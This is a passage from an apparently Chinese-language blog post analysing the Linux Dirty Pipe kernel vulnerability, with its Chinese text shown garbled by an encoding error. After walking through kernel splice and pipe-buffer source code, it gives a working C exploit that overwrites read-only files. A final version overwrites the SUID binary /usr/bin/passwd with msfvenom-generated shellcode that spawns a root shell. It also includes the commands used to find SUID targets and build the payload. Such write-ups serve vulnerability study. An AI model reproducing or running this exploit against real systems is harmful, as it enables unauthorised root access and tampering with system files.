buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>	<span class="hljs-keyword">if</span> (off) &#123;<br>		<span class="hljs-keyword">if</span> (offset == off &amp;&amp; buf-&gt;page == page) &#123;<br>			<span class="hljs-comment">/* merge with the last one */</span><br>			buf-&gt;len += bytes;<br>			i-&gt;iov_offset += bytes;<br>			<span class="hljs-keyword">goto</span> out;<br>		&#125;<br>		i_head++;<br>		buf = &amp;pipe-&gt;bufs[i_head &amp; p_mask];<br>	&#125;<br>	<span class="hljs-keyword">if</span> (pipe_full(i_head, p_tail, pipe-&gt;max_usage))<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>	buf-&gt;ops = &amp;page_cache_pipe_buf_ops;<br>	get_page(page);<br>	buf-&gt;page = page;<br>	buf-&gt;offset = offset;<br>	buf-&gt;len = bytes;<br><br>	pipe-&gt;head = i_head + <span class="hljs-number">1</span>;<br>	i-&gt;iov_offset = offset + bytes;<br>	i-&gt;head = i_head;<br>out:<br>	i-&gt;count -= bytes;<br>	<span class="hljs-keyword">return</span> bytes;<br>&#125;<br></code></pre></td></tr></table></figure>

<p><strong>PSÔºöÊ≠§Â§ÑÂπ∂Ê≤°ÊúâÂØπpipe_buffer-&gt;flagsÁöÑËÆæÁΩÆÊìç‰Ωú</strong></p>
<h3 id="ÁÆ°ÈÅì-Êñá‰ª∂"><a href="#ÁÆ°ÈÅì-Êñá‰ª∂" class="headerlink" title="ÁÆ°ÈÅì-&gt;Êñá‰ª∂"></a>ÁÆ°ÈÅì-&gt;Êñá‰ª∂</h3><h4 id="do-splice-from"><a href="#do-splice-from" class="headerlink" title="do_splice_from"></a>do_splice_from</h4><p><code>do_splice_from</code> ÊúÄÁªà‰ºöÊ†πÊçÆÊâÄÊìç‰ΩúÁöÑÊñá‰ª∂ÁöÑÂ±ûÊÄßË∞ÉÁî®Áõ∏Â∫îÁöÑÂÜÖÊ†∏Êñá‰ª∂ÁªìÊûÑ‰∏≠ÁöÑ <code>splice_write()</code> ÂáΩÊï∞ÊåáÈíà„ÄÇ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Attempt to initiate a splice from pipe to file.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">do_splice_from</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-keyword">struct</span> file *out,</span><br><span class="hljs-params">			   <span class="hljs-type">loff_t</span> *ppos, <span class="hljs-type">size_t</span> len, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> flags)</span><br>&#123;<br>	<span class="hljs-keyword">if</span> (out-&gt;f_op-&gt;splice_write)<br>		<span class="hljs-keyword">return</span> out-&gt;f_op-&gt;splice_write(pipe, out, ppos, len, flags);<br>	<span class="hljs-keyword">return</span> default_file_splice_write(pipe, out, ppos, len, flags);<br>&#125;<br><br></code></pre></td></tr></table></figure>

<h4 id="iter-file-splice-write"><a href="#iter-file-splice-write" class="headerlink" title="iter_file_splice_write"></a>iter_file_splice_write</h4><p>Âú®ext4Êñá‰ª∂Á≥ªÁªü‰∏≠ÔºåËøô‰∏™ÂáΩÊï∞ÊåáÈíàÊòØ<code>iter_file_splice_write</code>ÔºåÊúÄÁªà‰ºöË∞ÉÁî®Â¶Ç‰∏ãÂáΩÊï∞</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs abnf">iter_file_splice_write<br>	splice_from_pipe_next <span class="hljs-comment">;Ê£ÄÊü•ÁÆ°ÈÅìÂèØÁî®ÊÄß</span><br>	vfs_iter_write <span class="hljs-comment">;Â∞ÜËØªÂèñÁöÑÊï∞ÊçÆÂÜôÂÖ•ÁõÆÊ†áÊñá‰ª∂</span><br>		do_iter_write<br>			do_iter_readv_writev<br>				 call_write_iter<br>				 	generic_file_write_iter <span class="hljs-comment">;ÂêéÈù¢ËøòÊúâÔºå‰ΩÜÂ∫îËØ•Â∞±ÊòØÊôÆÈÄöÁöÑÊã∑Ë¥ùÊï∞ÊçÆ‰πãÁ±ªÁöÑ</span><br></code></pre></td></tr></table></figure>



<h1 id="0x03ÔºöÊºèÊ¥ûÂàÜÊûê"><a href="#0x03ÔºöÊºèÊ¥ûÂàÜÊûê" class="headerlink" title="0x03ÔºöÊºèÊ¥ûÂàÜÊûê"></a>0x03ÔºöÊºèÊ¥ûÂàÜÊûê</h1><p>Êàë‰ª¨Áé∞Âú®Áü•ÈÅì‰ª•‰∏ãÂá†ÁÇπ</p>
<ul>
<li>PIPE_BUF_FLAG_CAN_MERGEÊòØpipe_buffer-&gt;pageÊòØÂê¶ËÉΩÂÜôÂÖ•ÁöÑÊ†áÂøó</li>
<li>pipe_write‰∏≠‰ºöÂ∞Üpipe_buffer-&gt;flagsËÆæÁΩÆÊàêPIPE_BUF_FLAG_CAN_MERGE</li>
<li>pipe_read‰∏≠ËØªÂèñÂÆåÊàêÂêéfreeËøô‰∫õpageÂπ∂‰∏ç‰ºöÊääflagsÁΩÆ0</li>
<li>‰ªéÊñá‰ª∂Â§çÂà∂Âà∞ÁÆ°ÈÅì‰∏≠copy_page_to_iter_pipe‰∏≠get_page‰∏ç‰ºöÈáçÊñ∞ËÆæÁΩÆflagsÔºåÂõ†Ê≠§Ê≠§Êó∂pipe_bufferÊåáÂêëÁöÑpageÊòØÁõÆÊ†áÊñá‰ª∂Êò†Â∞ÑÁöÑpageÔºåpipe_buffer-&gt;flags &amp;&amp; PIPE_BUF_FLAG_CAN_MERGE &#x3D;&#x3D; trueÔºåË°®Á§∫Ê≠§Êó∂ÂØπËøô‰∏™pageÊã•ÊúâÂÜôÂÖ•ÊùÉÈôê‰∫Ü„ÄÇËøôÂ∞±ÊÑèÂë≥ÁùÄÂ¶ÇÊûúÊàë‰ª¨ÊâìÂºÄÁöÑÊòØ‰∏Ä‰∏™Âè™ÊúâÂè™ËØªÊùÉÈôêÁöÑÊñá‰ª∂ÔºåÁé∞Âú®ÂèØ‰ª•Ë∂äÊùÉÂÜôÂÖ•</li>
</ul>
<p>‰∫éÊòØÊúâ‰∫ÜËøôÊ†∑‰∏Ä‰∏™ÊÄùË∑Ø</p>
<ul>
<li>step ‚Ö†ÔºöÂàõÂª∫‰∏Ä‰∏™pipe</li>
<li>step ‚Ö°ÔºöÊääpipeÂÜôÊª°Ôºå‰ΩøÊâÄÊúâpipe_buffer-&gt;flagsÈÉΩË¢´ËÆæÁΩÆ‰∏äPIPE_BUF_FLAG_CAN_MERGE</li>
<li>step ‚Ö¢ÔºöËØªÂèñpipe‰∏≠ÁöÑÊâÄÊúâÊï∞ÊçÆÔºåÊ∏ÖÁ©∫pipe</li>
<li>step ‚Ö£ÔºöÊâìÂºÄÁõÆÊ†áÊñá‰ª∂ÔºåÂà©Áî®spliceÂ∞ÜÂÜÖÂÆπ‰ªéÊñá‰ª∂Êã∑Ë¥ùÂà∞ÁÆ°ÈÅìÔºåÊ≠§Êó∂pipe_buffer-&gt;page‰∏∫Êñá‰ª∂Âú®ÂÜÖÂ≠ò‰∏≠ÁöÑÊò†Â∞ÑÈ°µÊ°ÜÔºåpipe_buffer-&gt;flags‰øùÁïôÊúâ‰πãÂâçËÆæÁΩÆÁöÑPIPE_BUF_FLAG_CAN_MERGEÔºåÊ≠§Êó∂Âú®ÁÆ°ÈÅì‰∏≠ÂØπËØ•Êñá‰ª∂ÂÖ∑ÊúâÂÜôÂÖ•ÊùÉÈôê„ÄÇpipe head +1</li>
<li>step ‚Ö§ÔºöÂà©Áî®writeÂêëÁÆ°ÈÅì‰∏≠ÂÜôÂÖ•ÊÅ∂ÊÑèÊï∞ÊçÆÔºåÂõ†‰∏∫‰∏ä‰∏Ä‰∏™ pipe_buffer Ê≤°ÊúâÂÜôÊª°Ôºå‰ªéËÄåÂ∞ÜÊï∞ÊçÆÊã∑Ë¥ùÂà∞‰∏ä‰∏Ä‰∏™ pipe_buffer ÂØπÂ∫îÁöÑÈ°µÈù¢‚Äî‚ÄîÂç≥Êñá‰ª∂Êò†Â∞ÑÁöÑÈ°µÈù¢„ÄÇÂÆåÊàêË∂äÊùÉÂÜôÂÖ•</li>
</ul>
<h1 id="0x04ÔºöÊºèÊ¥ûÂà©Áî®"><a href="#0x04ÔºöÊºèÊ¥ûÂà©Áî®" class="headerlink" title="0x04ÔºöÊºèÊ¥ûÂà©Áî®"></a>0x04ÔºöÊºèÊ¥ûÂà©Áî®</h1><h2 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h2><p>ÁªèËøá‰∏äËø∞ÂàÜÊûêÂà©Áî®demoÂ∞±ÂæàÂ•ΩÂÜô‰∫Ü</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_DEF_BUFFERS 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DATA_SIZE PAGE_SIZE*PIPE_DEF_BUFFERS</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>;</span><br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], dest_fd;<br><span class="hljs-type">pid_t</span> fork_pid;<br><span class="hljs-type">char</span> * data;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> * argv[], <span class="hljs-type">char</span> * envp[])</span><br>&#123;<br>    data = mmap(<span class="hljs-literal">NULL</span>, DATA_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] make pipe_buffer all flags-&gt; PIPE_BUF_FLAG_CAN_MERGE&quot;</span>);<br>    pipe(pipe_fd);<br>    fork_pid = fork();<br>    <span class="hljs-keyword">if</span> (fork_pid &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;fork failed!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fork_pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pipe write&quot;</span>);<br>        write(pipe_fd[<span class="hljs-number">1</span>], data, DATA_SIZE);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pipe read&quot;</span>);<br>    read(pipe_fd[<span class="hljs-number">0</span>], data, DATA_SIZE);<br><br><br>    dest_fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dest_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open dest file failed!&quot;</span>);<br><br>    fstat(dest_fd, &amp;dest_st);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] keep the flags-&gt;PIPE_BUF_FLAG_CAN_MERGE&quot;</span>);<br>    splice(dest_fd, <span class="hljs-literal">NULL</span>, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, SPLICE_F_MOVE);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] overwrite now&quot;</span>);<br>    write(pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;\nkorey0sh1\n&quot;</span>, <span class="hljs-number">11</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>Èöè‰æøÁî®qemuËµ∑‰∫Ü‰∏™ÁéØÂ¢ÉÔºåkernel version &#x3D; 5.8</p>
<p>ÊïàÊûúËøòÊòØÂæàÊàêÂäüÁöÑ</p>
<img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321143920.png" srcset="/img/loading.gif" lazyload style="zoom: 67%;" />

<h2 id="ÊèêÊùÉ"><a href="#ÊèêÊùÉ" class="headerlink" title="ÊèêÊùÉ"></a>ÊèêÊùÉ</h2><p>Â∏∏ËßÑÁöÑsuidÊèêÊùÉÊñπÂºè</p>
<p>Êü•ÁúãÂÖ∑ÊúârootÊùÉÈôêÁöÑsuidÊñá‰ª∂</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null<br></code></pre></td></tr></table></figure>

<p>Ê≠§Â§ÑËøòÊòØÈÄâÊã©ËÄÅÊúãÂèã&#x2F;usr&#x2F;bin&#x2F;passwd</p>
<p>Áî®msfÁîüÊàêÊèêÊùÉÁöÑshellcode</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p linux/x64/exec PrependSetuid=True -f elf | xxd -i<br></code></pre></td></tr></table></figure>



<h3 id="final-exp"><a href="#final-exp" class="headerlink" title="final exp"></a>final exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE 0x1000</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PIPE_DEF_BUFFERS 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> DATA_SIZE PAGE_SIZE*PIPE_DEF_BUFFERS</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">stat</span> <span class="hljs-title">dest_st</span>;</span><br><span class="hljs-type">int</span> pipe_fd[<span class="hljs-number">2</span>], dest_fd;<br><span class="hljs-type">pid_t</span> fork_pid;<br><span class="hljs-type">char</span> * data;<br><br><span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> attack_data[] = &#123;<br>  <span class="hljs-number">0x7f</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x4c</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x3e</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x78</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x95</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xb2</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x00</span>,<br>  <span class="hljs-number">0x48</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0xff</span>, <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0xb8</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x62</span>,<br>  <span class="hljs-number">0x69</span>, <span class="hljs-number">0x6e</span>, <span class="hljs-number">0x2f</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x5f</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x5e</span>,<br>  <span class="hljs-number">0x6a</span>, <span class="hljs-number">0x3b</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x0f</span>, <span class="hljs-number">0x05</span><br>&#125;;<br><br><span class="hljs-type">int</span> data_len = <span class="hljs-number">149</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">err_exit</span><span class="hljs-params">(<span class="hljs-type">char</span> *msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    sleep(<span class="hljs-number">5</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc , <span class="hljs-type">char</span> * argv[], <span class="hljs-type">char</span> * envp[])</span><br>&#123;<br>    data = mmap(<span class="hljs-literal">NULL</span>, DATA_SIZE, PROT_READ|PROT_WRITE, MAP_ANONYMOUS|MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-literal">NULL</span>);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] make pipe_buffer all flags-&gt; PIPE_BUF_FLAG_CAN_MERGE&quot;</span>);<br>    pipe(pipe_fd);<br>    fork_pid = fork();<br>    <span class="hljs-keyword">if</span> (fork_pid &lt; <span class="hljs-number">0</span>)<br>    &#123;<br>        err_exit(<span class="hljs-string">&quot;fork failed!&quot;</span>);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (fork_pid == <span class="hljs-number">0</span>)<br>    &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pipe write&quot;</span>);<br>        write(pipe_fd[<span class="hljs-number">1</span>], data, DATA_SIZE);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pipe read&quot;</span>);<br>    read(pipe_fd[<span class="hljs-number">0</span>], data, DATA_SIZE);<br><br><br>    dest_fd = open(argv[<span class="hljs-number">1</span>], O_RDONLY);<br>    <span class="hljs-keyword">if</span> (dest_fd &lt; <span class="hljs-number">0</span>)<br>        err_exit(<span class="hljs-string">&quot;open dest file failed!&quot;</span>);<br><br>    fstat(dest_fd, &amp;dest_st);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] keep the flags-&gt;PIPE_BUF_FLAG_CAN_MERGE&quot;</span>);<br>    splice(dest_fd, <span class="hljs-literal">NULL</span>, pipe_fd[<span class="hljs-number">1</span>], <span class="hljs-literal">NULL</span>, <span class="hljs-number">1</span>, SPLICE_F_MOVE);<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] overwrite now&quot;</span>);<br>    <span class="hljs-comment">//‰ªéÁ¨¨‰∫å‰ΩçÂºÄÂßãË¶ÜÂÜô</span><br>    write(pipe_fd[<span class="hljs-number">1</span>], &amp;attack_data[<span class="hljs-number">1</span>], data_len<span class="hljs-number">-1</span>);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure>

<p>ÁéØÂ¢ÉÔºö</p>
<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/20240321201804.png" srcset="/img/loading.gif" lazyload></p>
<p>ËøêË°åÊïàÊûú</p>
<p><img src="https://cdn.jsdelivr.net/gh/korey0sh1/clouding@master/data/5365682d6c51a6882c74dd06b604bb9.png" srcset="/img/loading.gif" lazyload></p>
<h1 id="some-tricks"><a href="#some-tricks" class="headerlink" title="some tricks"></a>some tricks</h1><p>Á¨îËÄÖÂú®ÊúÄÂêé‰∏ÄÁõ¥Ëã¶‰∫éÊâæ‰∏çÂà∞ÂêàÈÄÇÁöÑkernelÁâàÊú¨ÁöÑËôöÊãüÊú∫ÂëúÂëúÂëúÂëúÂëúÔºåÂõ†‰∏∫‰∏ã‰∫Ü‰∏™Êå∫Âè§Êó©ÁâàÊú¨ÁöÑubuntu20ÔºåËßâÂæóÂ∫îËØ•ËÉΩÁ¨¶ÂêàÁâàÊú¨Ë¶ÅÊ±Ç</p>
<p>ÁªìÊûúÁé©ÊÑè‰ºöËá™Âä®Êõ¥Êñ∞Ôºå‰∏ã‰∏ãÊù•ÊºèÊ¥ûÈÉΩÊòØË¢´patchÁöÑ</p>
<p>ÊúÄÂêéÂèëÁé∞‰∫Ü<a target="_blank" rel="noopener" href="https://bbs.kanxue.com/user-home-919002.htm">xi@0ji233</a> ÁöÑÊñáÁ´†Ôºå‰∫ÜËß£Âà∞‰∫Ü‰∏ÄÁßçÂçÅÂàÜÊñπ‰æøÂø´Êç∑ÁöÑÊõ¥Êç¢kernelÁâàÊú¨ÁöÑÊñπÊ≥ï</p>
